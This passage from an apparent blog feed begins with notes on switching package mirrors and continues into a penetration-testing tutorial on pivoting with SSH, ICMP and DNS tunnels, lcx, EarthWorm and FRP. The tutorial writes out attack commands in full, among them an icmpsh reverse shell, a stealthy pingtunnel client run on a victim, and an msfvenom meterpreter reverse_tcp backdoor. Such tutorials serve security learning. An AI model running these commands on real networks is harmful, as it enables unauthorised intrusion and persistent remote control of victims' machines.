<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim  ~/.pip/pip.conf  <span class="comment"># edit or create it</span></span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
<p>Or one command to configure</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
<p>Some other sources</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aliyun: http://mirrors.aliyun.com/pypi/simple/ </span><br><span class="line">ustc: https://pypi.mirrors.ustc.edu.cn/simple/ </span><br><span class="line">douban: http://pypi.douban.com/simple/ </span><br><span class="line">hust: http://pypi.hustunique.com/</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>For windows this file is in <code>C:\Users\-YourUserName-\pip\pip.ini</code></p>
<p>On some latest released <code>Linux</code> like <code>Ubuntu 20.xx</code>, the <code>pip</code> of <code>Python2</code> (<code>python2-pip</code>) is not included in the official repo, so we install it by <code>get-pip.py</code>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo apt update </span><br><span class="line">$ sudo apt install python2</span><br><span class="line">$ curl https://bootstrap.pypa.io/get-pip.py --output get-pip.py</span><br><span class="line">$ sudo python2 get-pip.py       <span class="comment"># no `sudo` if install only for u</span></span><br><span class="line">$ pip2 --version                <span class="comment"># check </span></span><br></pre></td></tr></table></figure>
<h2 id="Change-Docker-Registry"><a href="#Change-Docker-Registry" class="headerlink" title="Change Docker Registry"></a>Change <code>Docker</code> Registry</h2><p>Just edit the file</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://9cpn8tt6.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Some others</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netease: http://hub-mirror.c.163.com</span><br><span class="line">ustc: https://docker.mirrors.ustc.edu.cn</span><br><span class="line">aliyun: https://pee6w651.mirror.aliyuncs.com</span><br><span class="line">        https://kfwkfulq.mirror.aliyuncs.com</span><br><span class="line">        https://2lqq34jg.mirror.aliyuncs.com</span><br><span class="line">        http://&lt;personal ID&gt;.mirror.aliyuncs.com</span><br><span class="line">Visit `https://cr.console.aliyun.com/` to get your own aliyun accelerate ID</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Then we do</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ systemctl  daemon-reload</span><br><span class="line">$ systemctl  restart  docker</span><br></pre></td></tr></table></figure>
<p>If you run docker on windows, I highly recommend you to use virtualbox to be the host, which is convenient to update, storage expansion and network configuration.</p>
<h2 id="Change-gem-Sources"><a href="#Change-gem-Sources" class="headerlink" title="Change gem Sources"></a>Change <code>gem</code> Sources</h2><p>Update first(<code>ruby</code> developer does)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ gem update --system  <span class="comment"># oh this step needs to climb off the G F W</span></span><br><span class="line">$ gem -v</span><br><span class="line">2.6.3</span><br></pre></td></tr></table></figure>
<p>Then change sources</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ gem sources --add https://gems.ruby-china.com/ --remove https://rubygems.org/</span><br><span class="line">$ gem sources -l</span><br><span class="line">https://gems.ruby-china.com</span><br><span class="line"><span class="comment"># make sure there is only &#x27;gems.ruby-china.com&#x27;</span></span><br></pre></td></tr></table></figure>
<p>If you are using <code>Gemfile</code> or <code>Bundler</code><br>Edit <code>Gemfile</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> <span class="string">&#x27;https://gems.ruby-china.com/&#x27;</span></span><br><span class="line">gem <span class="string">&#x27;rails&#x27;</span>, <span class="string">&#x27;4.2.5&#x27;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>or just</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ bundle config mirror.https://rubygems.org https://gems.ruby-china.com</span><br></pre></td></tr></table></figure>

<h2 id="Change-npm-Registry"><a href="#Change-npm-Registry" class="headerlink" title="Change npm Registry"></a>Change <code>npm</code> Registry</h2><p>You can replace <code>npm</code> with <code>cnpm</code>, then use <code>cnpm</code> to install packages. </p>
<p>Install the <code>cnpm</code> by </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>

<p>Or, change package source can be conducted by</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>
<p>Then see the result</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ npm config list</span><br></pre></td></tr></table></figure>

<h2 id="Change-go-Sources"><a href="#Change-go-Sources" class="headerlink" title="Change go Sources"></a>Change <code>go</code> Sources</h2><p>Execute</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ go env -w GO111MODULE=on</span><br><span class="line">$ go env -w GOPROXY=https://goproxy.cn</span><br></pre></td></tr></table></figure>
<p>or change envs</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">export</span> GO111MODULE=on</span><br><span class="line">$ <span class="built_in">export</span> GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>docker</tag>
        <tag>linux</tag>
        <tag>pip</tag>
        <tag>gem</tag>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>About Port Forwarding</title>
    <url>/2020/03/15/2020-03-15-About-Port-Forwarding/</url>
    <content><![CDATA[<p>When performing penetration testing, there are always network connection limits.<br>Port forwarding can bypass them and provide other advantages.</p>
<h2 id="SSH-Tunnel"><a href="#SSH-Tunnel" class="headerlink" title="SSH Tunnel"></a>SSH Tunnel</h2><p><code>SSH</code> can automatically encrypt and decrypt all network data between server and client, can also forward network data from other TCP ports via SSH connection, which is called “<code>SSH</code> Tunnel”.</p>
<p>“<code>SSH</code> Tunnel” has two advantages:</p>
<ul>
<li>Encrypt communication data between <code>SSH</code> Client and <code>SSH</code> Server</li>
<li>Break through firewall restrictions and build some TCP connections that could not be established before</li>
</ul>
<h3 id="Basic-Config"><a href="#Basic-Config" class="headerlink" title="Basic Config"></a>Basic Config</h3><p>Configuration files include:</p>
<ul>
<li>Server side config: <code>/etc/ssh/sshd_config</code></li>
<li>Client side config: <code>/etc/ssh/sshd_config</code></li>
<li>User config: <code>~/.ssh/config</code></li>
</ul>
<p>Here are related items </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">AllowTcpForwarding yes</span><br><span class="line"><span class="comment"># seems necessary </span></span><br><span class="line"><span class="comment"># default &#x27;yes&#x27;</span></span><br><span class="line">GatewayPorts yes</span><br><span class="line"><span class="comment"># allow all remote to connect local forwarding port</span></span><br><span class="line"><span class="comment"># default &#x27;no&#x27;</span></span><br><span class="line"><span class="comment"># parameter &#x27;clientspecified&#x27; means client assigns one IP to connect</span></span><br><span class="line"><span class="comment"># if we have:</span></span><br><span class="line"><span class="comment"># `ssh -R specified_ip:local_port:remote_ip:remote_port www.example.com`</span></span><br><span class="line"><span class="comment"># &#x27;specified_ip&#x27; is the allowed IP</span></span><br><span class="line">TCPKeepAlive yes</span><br><span class="line"><span class="comment"># helps detect dead connection, improper connection, client crash</span></span><br><span class="line"><span class="comment"># default &#x27;yes&#x27;</span></span><br><span class="line">PasswordAuthentication yes</span><br><span class="line"><span class="comment"># always needed</span></span><br></pre></td></tr></table></figure>

<h3 id="Detailed-Parameters"><a href="#Detailed-Parameters" class="headerlink" title="Detailed Parameters"></a>Detailed Parameters</h3><p>Here are related parameters for building the tunnel</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-C -- compress transmission, speed it up </span><br><span class="line">-f -- authenticate in the background</span><br><span class="line">-N -- only forwarding without getting shell</span><br><span class="line">-q -- quiet mode, no debug info</span><br><span class="line">-l -- assign ssh username</span><br><span class="line">-g -- allow remote to connect local </span><br><span class="line">-L -- local forwarding</span><br><span class="line">-R -- remote forwarding</span><br><span class="line">-D -- dynamic forwarding (socks proxy)</span><br><span class="line">-T -- no pseudo terminal assignment</span><br><span class="line">-p -- assign remote ssh port</span><br></pre></td></tr></table></figure>

<h3 id="Local-Forwarding"><a href="#Local-Forwarding" class="headerlink" title="Local Forwarding"></a>Local Forwarding</h3><p>Transfer local port data to remote host. Local host is ssh client and application client. </p>
<p>We have 3 objects:</p>
<ul>
<li>Attacker pc</li>
<li>VPS with public ip</li>
<li>Target&#x2F;Victim pc</li>
</ul>
<p>The situation is, VPS is allowd to connect target while attacker isn’t.</p>
<p>If attacker want to connect target’s 3389 to use rdp, on attacker pc we do</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ssh -C -f -N -g -L local_port:remote_ip:remote_port user@Tunnel_Host</span><br><span class="line"><span class="comment"># it means: </span></span><br><span class="line"><span class="comment"># forward localhost:local_port to remote_ip:remote_port via tunnel</span></span><br><span class="line"><span class="comment"># `-L` means ssh from local to tunnel, and listening local port</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># example:</span></span><br><span class="line">$ ssh -C -f -N -g -L 33389:target_ip:3389 user@VPS_ip -p 22</span><br></pre></td></tr></table></figure>
<p>The whole process will be:</p>
<ol>
<li>Attacker connects local 33389 </li>
<li>The network data is transferred to VPS using ssh</li>
<li>VPS then connects target 3389</li>
</ol>
<p>So the ssh tunnel is built from attacker to VPS, and listen attacker pc’s port.</p>
<h3 id="Remote-Forwarding"><a href="#Remote-Forwarding" class="headerlink" title="Remote Forwarding"></a>Remote Forwarding</h3><p>Transfer remote port data to local host. Local host is ssh client but application server. </p>
<p>We have 4 objects:</p>
<ul>
<li>Attacker pc</li>
<li>VPS with public ip</li>
<li>Target&#x2F;Victim pc 1, allow internet</li>
<li>Target&#x2F;Victim pc 2, disallow internet</li>
</ul>
<p>The situation is, only victim 1 is allowed to connect victim 2, and victim 1 can be controlled through internet.</p>
<p>If attacker want to connect victim 2, on victim 1 (controlled) we do</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ssh -C -f -N -g -R local_port:remote_ip:remote_port user@Tunnel_Host</span><br><span class="line"><span class="comment"># it means: </span></span><br><span class="line"><span class="comment"># forward tunnel_ip:local_port to remote_ip:remote_port via local</span></span><br><span class="line"><span class="comment"># `-R` means ssh from local to tunnel, but listening tunnel port</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># example</span></span><br><span class="line">$ ssh -C -f -N -g -R 33389:victim_2_ip:3389 user@VPS_ip -p 22</span><br></pre></td></tr></table></figure>
<p>The whole process will be:</p>
<ul>
<li>Attacker connects VPS port 33389</li>
<li>VPS transfers data to victim 1 using ssh</li>
<li>victim 1 then connect victim 2</li>
</ul>
<p>So the ssh tunnel is from victim 1 to VPS, but VPS port is listening.</p>
<p>note: it default listens on <code>127.0.0.1</code> rather than <code>0.0.0.0</code>, so we use <code>rinetd</code> to do local port forwarding</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt install rinetd -y</span><br><span class="line">$ vim /etc/rinetd.conf <span class="comment"># add policy </span></span><br><span class="line">...</span><br><span class="line">0.0.0.0 3389 127.0.0.1 33389 <span class="comment"># forwarding policy</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$ service rinetd start <span class="comment"># start service</span></span><br><span class="line">$ netstat -an |egrep <span class="string">&quot;3389|33389&quot;</span> <span class="comment"># check listening status </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Dynamic-Forwarding"><a href="#Dynamic-Forwarding" class="headerlink" title="Dynamic Forwarding"></a>Dynamic Forwarding</h3><p>It is exactly building a <code>SSH</code> encrypted socks4&#x2F;5 proxy tunnel. </p>
<p>If we are in the same situation as Local Forwarding part gives, but attackers have no information or no target ports of victims, a proxy is needed for infomation gathering.</p>
<p>On attacker pc, we build a ssh tunnel to VPS</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ssh -C -f -N -g -D listen_port user@Tunnel_Host</span><br><span class="line"><span class="comment"># forward localhost:listen_port to ssh VPS</span></span><br><span class="line"><span class="comment"># no ports specified</span></span><br><span class="line"><span class="comment"># just set up a proxy (part of local forwarding)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># example</span></span><br><span class="line">$ ssh -C -f -N -g -D 10080 user@VPS_ip -p 22 </span><br><span class="line"><span class="comment"># listen 127.0.0.1</span></span><br><span class="line">$ ssh -C -f -N -g -D 0.0.0.0:10080 user@VPS_ip -p 22 </span><br><span class="line"><span class="comment"># listen 0.0.0.0</span></span><br></pre></td></tr></table></figure>

<h2 id="ICMP-Tunnel"><a href="#ICMP-Tunnel" class="headerlink" title="ICMP Tunnel"></a>ICMP Tunnel</h2><p>Since the tunnel is established through the ICMP protocol, to let tunnel server process the received ICMP messages, the system’s ICMP response mechanism needs to be disabled to prevent the kernel from responding to the ping packet.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure>

<h3 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h3><p>It can build server as springboard or proxy.<br>On the same server (as a springboard) , we run <code>ptunnel</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt install ptunnel <span class="comment"># install first</span></span><br><span class="line">$ ptunnel <span class="comment"># run </span></span><br><span class="line"><span class="comment"># or </span></span><br><span class="line">$ ptunnel -x whoami</span><br></pre></td></tr></table></figure>

<p>Then on a client, we do</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ptunnel -p server_ip -lp local_port -da target_ip  -dp target_port</span><br><span class="line"><span class="comment"># -p  server (springboard) ip</span></span><br><span class="line"><span class="comment"># -lp local listening port</span></span><br><span class="line"><span class="comment"># -da final target host ip</span></span><br><span class="line"><span class="comment"># -dp final target host port</span></span><br><span class="line"><span class="comment"># or </span></span><br><span class="line">$ ptunnel -p VPS_ip -lp local_port -da target_ip -dp target_port -x whoami</span><br></pre></td></tr></table></figure>

<p>Connect local listening port to use this tunnel, to reach target host.</p>
<h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>It provides ICMP reverse shell.<br>Click <a class="link"   href="https://github.com/inquisb/icmpsh" >this link<i class="fas fa-external-link-alt"></i></a> to download icmpsh.</p>
<p>Then on client we do</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br><span class="line"><span class="comment"># disable ping echo, to keep shell stable</span></span><br><span class="line">$ ./icmpsh_m.py &lt;<span class="built_in">source</span> IP address&gt; &lt;destination IP address&gt;</span><br><span class="line">$ python icmpsh_m.py clent_ip server_ip</span><br></pre></td></tr></table></figure>

<p>On server we do</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt; icmpsh.exe -t client_ip</span><br></pre></td></tr></table></figure>

<p>Finally a shell is transferred to client.</p>
<h3 id="Pingtunnel"><a href="#Pingtunnel" class="headerlink" title="Pingtunnel"></a>Pingtunnel</h3><p>It is another tool to provide encrypted ICMP tunnel.<br>Click <a class="link"   href="https://github.com/esrrhs/pingtunnel/tree/delete" >this link<i class="fas fa-external-link-alt"></i></a> for source code, and visit <a class="link"   href="https://github.com/esrrhs/pingtunnel/releases/tag/2.6" >releases<i class="fas fa-external-link-alt"></i></a> to download.</p>
<p>Start server on your VPS</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./pingtunnel -<span class="built_in">type</span> server</span><br></pre></td></tr></table></figure>

<p>Upload and execute the client by</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt; pingtunnel.exe -<span class="built_in">type</span> client -l <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">9999</span> -s VPS_ip -t  attacker_ip:attacker_port -tcp <span class="number">1</span> -noprint <span class="number">1</span> -nolog <span class="number">1</span> </span><br></pre></td></tr></table></figure>

<p>Then generate backdoor </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=9999 -f exe -o AAA.exe</span><br></pre></td></tr></table></figure>

<p>Then backdoor will connect local 9999, and pingtunnel.exe will transfer it to VPS(icmpserver), and VPS will send it to attacker.</p>
<h2 id="DNS-Tunnel"><a href="#DNS-Tunnel" class="headerlink" title="DNS Tunnel"></a>DNS Tunnel</h2><p>Intranet generally has strict limits on outbound traffic, but usually do not restrict DNS (UDP 53) requests.</p>
<p>There are two main working modes: direct connection mode and relay mode.<br>Direct connection mode is like normal proxy.<br>Relay mode looks like<br><img src="/imghost/apf/1.jpg" alt="relay mode"></p>
<h3 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h3><p>It is the direct connection mode.</p>
<p>Server side deployment</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line">$ apt-get install ruby-dev </span><br><span class="line">$ <span class="built_in">cd</span> dnscat2/server/ </span><br><span class="line">$ gem install bundler </span><br><span class="line">$ bundle install </span><br><span class="line">$ ruby ./dnscat2.rb  <span class="comment"># run server</span></span><br><span class="line"><span class="comment"># use &#x27;-security=open&#x27; to disable encryption</span></span><br></pre></td></tr></table></figure>

<p>Client side deployment</p>
<ul>
<li>Compile first<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line">$ <span class="built_in">cd</span> dnscat2/client/</span><br><span class="line">$ make (on windows, load `client/win32/dnscat2.vcproj` to Visual Studio and <span class="string">&quot;build&quot;</span> )</span><br></pre></td></tr></table></figure></li>
<li>Connect secondly<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./dnscat --dns server=server_ip,port=53 --secret=xxx_give_in_server_display_xxx</span><br></pre></td></tr></table></figure></li>
<li>Use ‘help’ to see commands<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">windows/sessions  --  display current sessions</span><br><span class="line">window/session -i 1  --  enter session 1</span><br><span class="line">shell  --  create new session</span><br><span class="line">ctrl+z  --  go back to last layer</span><br></pre></td></tr></table></figure>
Now we use client to control server.</li>
</ul>
<h3 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h3><p>It is the relay mode like <code>dns2tcp</code> (another util).<br>The point is to register server as DNS server with a domain name.</p>
<p>First download it and compile to build</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/yarrick/iodine</span><br><span class="line">$ <span class="built_in">cd</span> iodine</span><br><span class="line">$ make install</span><br><span class="line"><span class="comment"># under ./bin/, &#x27;iodined&#x27; is server, &#x27;iodine&#x27; is client</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ apt install iodine <span class="comment"># available for debian</span></span><br></pre></td></tr></table></figure>

<p>Server side we do</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ iodined -f -P yourpassword x.x.x.x www.dns.com</span><br><span class="line"><span class="comment"># -f -- display in the front</span></span><br><span class="line"><span class="comment"># -P -- assign auth password</span></span><br><span class="line"><span class="comment"># x.x.x.x -- Custom LAN Virtual IP</span></span><br><span class="line"><span class="comment"># www.dns.com -- DNS domain</span></span><br></pre></td></tr></table></figure>
<p>After that server adds a virtual netcard dns0 x.x.x.x to build a new LAN.</p>
<p>Client side we do</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ iodine -f -P yourpassword xx.xx.xx.xx www.dns.com</span><br><span class="line"><span class="comment"># xx.xx.xx.xx -- server ip</span></span><br><span class="line"><span class="comment"># domain name should be the same with server side</span></span><br></pre></td></tr></table></figure>
<p>After that client also adds dns0 but another ip, and now it connects server via this virtual netcard (build a tunnel).</p>
<h2 id="LCX-Forwarding"><a href="#LCX-Forwarding" class="headerlink" title="LCX Forwarding"></a>LCX Forwarding</h2><p>port forwarding is useful especially in intranet penetration.<br><a class="link"   href="https://github.com/search?q=lcx&type=" >Search lcx on Github<i class="fas fa-external-link-alt"></i></a> to get download.</p>
<h3 id="Parameter"><a href="#Parameter" class="headerlink" title="Parameter"></a>Parameter</h3><p>These are parameters usages and format</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">  lcx-&lt;listen|tran|slave&gt; &lt;option&gt; [-log logfile]</span><br><span class="line"></span><br><span class="line">[option:]</span><br><span class="line"></span><br><span class="line"> -listen &lt;ConnectPort&gt; &lt;TransmitPort&gt;</span><br><span class="line"></span><br><span class="line"> -tran&lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span><br><span class="line"></span><br><span class="line"> -slave &lt;ConnectHost&gt; &lt;ConnectPort&gt; &lt;TransmitHost&gt;&lt;TransmitPort&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>We have 3 objects:</p>
<ul>
<li>Attacker pc</li>
<li>VPS with public ip</li>
<li>Target&#x2F;Victim pc in intranet</li>
</ul>
<p>Still VPS is allowd to connect target while attacker isn’t.</p>
<p>On controlled victim pc in intranet</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt; lcx.exe -slave VPS_ip VPS_port intranet_ip intranet_port</span><br><span class="line"># transfer data </span><br><span class="line"># listen VPS_ip:VPS_port </span><br><span class="line"># and transfer to intranet_ip:intranet_port</span><br></pre></td></tr></table></figure>

<p>Then on VPS</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt; lcx.exe -listen dst_port src_port</span><br><span class="line"># listen data from src_port and transfer to dst_port </span><br><span class="line"># forward local port to local port</span><br><span class="line"># e.g.</span><br><span class="line">&gt; lcx.exe -listen VPS_port connect_port</span><br><span class="line"></span><br><span class="line"># or </span><br><span class="line"></span><br><span class="line">&gt; lcx.exe -tran src_port dst_ip dst_port </span><br><span class="line"># transfer data from src_port to dst_ip:dst_port </span><br><span class="line"># forward local port to remote port </span><br><span class="line"># e.g.</span><br><span class="line">&gt; lcx.exe -tran connect_port VPS_ip VPS_port</span><br></pre></td></tr></table></figure>

<p>Finally on attacker pc</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt; mstsc /v:VPS_ip:connect_port</span><br></pre></td></tr></table></figure>

<h2 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h2><p>Which is called EW&#x2F;ew as well, EarthWorm is capable for SOCKS v5 service setup and port forwarding.<br><a class="link"   href="https://github.com/search?q=ew&type=" >Search ew on Github<i class="fas fa-external-link-alt"></i></a> to get download.</p>
<p>The newest edition is <a class="link"   href="https://github.com/rootkiter/Termite" >Termite on Github<i class="fas fa-external-link-alt"></i></a> (<a class="link"   href="http://rootkiter.com/Termite/" >Official Site Here<i class="fas fa-external-link-alt"></i></a>)</p>
<h3 id="Parameters"><a href="#Parameters" class="headerlink" title="Parameters"></a>Parameters</h3><p>EarthWorm has 6 command formats （ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）.</p>
<p>socks type tunnel:</p>
<pre><code>ssocksd  --  start local Socks5 proxy service 
             use  -l
rssocks  --  start local Socks5 service, then transfer to another ip 
             use  -l -e
rcsocks  --  receive Socks5 service, then transfer to another port
             use  -d -e
</code></pre>
<p>lcx type tunnel:</p>
<pre><code>lcx_slave, lcx_listen: port forwarding
lcx_tran: port mapping

lcx_slave  -- like lcx -slave
              use  -d -e -f -g
lcx_tran   -- like lcx -tran
              use  -l -f -g
lcx_listen -- like lcx -listen
              use  -l -e
</code></pre>
<p>set parameters</p>
<pre><code>-l -- listen port
-d -- transfer to host ip
-e -- transfer to host port
-f -- connect to host ip
-g -- connect to host port
-t -- set time out
</code></pre>
<h3 id="Forward-proxy"><a href="#Forward-proxy" class="headerlink" title="Forward proxy"></a>Forward proxy</h3><p>That is normal proxy server.</p>
<p>On the socks server</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ew -s ssocksd -l lport</span><br></pre></td></tr></table></figure>

<p>Then use proxychains, proxifier or other tools to connect</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim /etc/proxychains.conf</span><br><span class="line">...</span><br><span class="line">socks5 x.x.x.x lport</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$ proxychains wget www.example.com</span><br></pre></td></tr></table></figure>

<h3 id="Reverse-proxy"><a href="#Reverse-proxy" class="headerlink" title="Reverse proxy"></a>Reverse proxy</h3><p>For a pc in intranet, it have to provide a reverse socks to VPS with public ip.</p>
<p>On intranet pc</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ew -s rssocks -d VPS_ip -e VPS_port</span><br><span class="line"><span class="comment"># transfer socks data to VPS_ip:VPS_port</span></span><br></pre></td></tr></table></figure>

<p>Then on VPS</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ew -s rcsocks -l lport -e VPS_port</span><br><span class="line"><span class="comment"># transfer data from lport to VPS_port, through socks</span></span><br></pre></td></tr></table></figure>

<p>Use proxychains, proxifier or other tools to connect</p>
<h3 id="LCX-type"><a href="#LCX-type" class="headerlink" title="LCX type"></a>LCX type</h3><p>Here are examples, which is similar to lcx</p>
<p>lcx_tran usage</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./ew -s ssocksd  -l 9999</span><br><span class="line">$ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999</span><br></pre></td></tr></table></figure>
<p>lcx_listen、lcx_slave usages</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line">$ ./ew -s ssocksd    -l 9999</span><br><span class="line">$ ./ew -s lcx_slave  -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span><br></pre></td></tr></table></figure>
<p>A comprehensive example</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./ew -s rcsocks -l 1080 -e 8888</span><br><span class="line">$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span><br><span class="line">$ ./ew -s lcx_listen -l 9999 -e 7777</span><br><span class="line">$ ./ew -s rssocks -d 127.0.0.1 -e 7777</span><br></pre></td></tr></table></figure>

<h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p>It is developed by go on <a class="link"   href="https://github.com/fatedier/frp" >Github<i class="fas fa-external-link-alt"></i></a>, a high-performance reverse proxy application for intranet penetration.</p>
<p>After extraction there are:<br><code>frpc  frpc_full.ini  frpc.ini  frps  frps_full.ini  frps.ini</code><br>The first three files are client programs and configuration files, last three are server programs and configuration files.</p>
<p>The situation is, we want to access client (in intranet) through (have to) server –&gt; reverse proxy.</p>
<p>Server side first.<br>The important part is its config file.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim frps.ini</span><br><span class="line">----------------------</span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0   </span><br><span class="line">bind_port = 7000</span><br><span class="line">dashboard_addr = 0.0.0.0   </span><br><span class="line">dashboard_port = 7500  </span><br><span class="line">token = 12345678   </span><br><span class="line">dashboard_user = admin  </span><br><span class="line">dashboard_pwd = admin </span><br><span class="line">vhost_http_port = 10080 </span><br><span class="line">vhost_https_port = 10443</span><br></pre></td></tr></table></figure>
<p>Start server by doing this</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./frps -c frps.ini</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">nohup ./frps -c frps.ini &amp; <span class="comment"># run background</span></span><br></pre></td></tr></table></figure>
<p>Access server 7500 port to see GUI dashboard.</p>
<p>Client side config file</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim frpc.ini</span><br><span class="line">----------------------</span><br><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x</span><br><span class="line">server_port = 7000</span><br><span class="line">token = 12345678 <span class="comment"># same as server side</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># service name</span></span><br><span class="line">[ssh]</span><br><span class="line"><span class="comment"># forwarding protocol type</span></span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 7001</span><br></pre></td></tr></table></figure>
<p>Run client </p>
